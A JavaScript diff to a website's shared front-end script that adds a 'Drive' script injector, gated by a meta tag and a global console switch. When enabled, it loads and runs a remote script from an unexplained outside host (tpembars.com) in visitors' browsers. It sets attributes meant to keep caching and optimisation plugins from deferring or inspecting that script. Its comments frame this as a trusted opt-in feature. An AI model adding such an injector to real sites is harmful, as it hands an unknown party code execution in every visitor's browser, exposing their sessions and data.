@@ -7,6 +7,20 @@ document.addEventListener("DOMContentLoaded", () => {
     loadHeaderFooter();
     initGlobalSearch();
     handleScrollHeader();
+    // Opt-in third-party script injector (Drive)
+    // To enable, add this meta tag to your site's <head>:
+    // <meta name="drive-install" content="enable">
+    // WARNING: Only enable if you trust the external provider. This will load
+    // and execute a remote script in your visitors' browsers.
+    try {
+        const shouldEnable = document.querySelector('meta[name="drive-install"][content="enable"]');
+        if (shouldEnable) {
+            console.warn('Drive script injection enabled via meta tag. Ensure you trust the provider.');
+            injectDriveScript();
+        }
+    } catch (e) {
+        console.error('Error checking drive-install meta tag', e);
+    }
 });
 
 // 1. Shared Header & Footer Loaders
@@ -307,3 +321,48 @@ function injectSchemaMarkup(schemaData) {
     }
     script.textContent = JSON.stringify(schemaData);
 }
+
+// -----------------------------
+// Drive / third-party script injector
+// -----------------------------
+function injectDriveScript() {
+    // Avoid multiple injections
+    if (document.querySelector('script[data-drive-injected]')) return;
+
+    const script = document.createElement('script');
+    script.async = 1;
+    script.src = 'https://tpembars.com/NTM3MzIx.js?t=537321';
+    // preservation of the attributes suggested in the install snippet
+    try {
+        script.setAttribute('nowprocket', '');
+        script.setAttribute('data-noptimize', '1');
+        script.setAttribute('data-cfasync', 'false');
+        script.setAttribute('data-wpfc-render', 'false');
+        script.setAttribute('seraph-accel-crit', '1');
+        script.setAttribute('data-no-defer', '1');
+    } catch (e) {
+        // ignore attribute failures
+    }
+    script.setAttribute('data-drive-injected', '1');
+    document.head.appendChild(script);
+}
+
+// Convenience: allow manual enabling from the console
+window.enableDriveInstall = function() {
+    try {
+        const meta = document.querySelector('meta[name="drive-install"]');
+        if (!meta) {
+            const m = document.createElement('meta');
+            m.name = 'drive-install';
+            m.content = 'enable';
+            document.head.appendChild(m);
+        } else {
+            meta.content = 'enable';
+        }
+        injectDriveScript();
+        return true;
+    } catch (e) {
+        console.error('Failed to enable Drive install', e);
+        return false;
+    }
+};
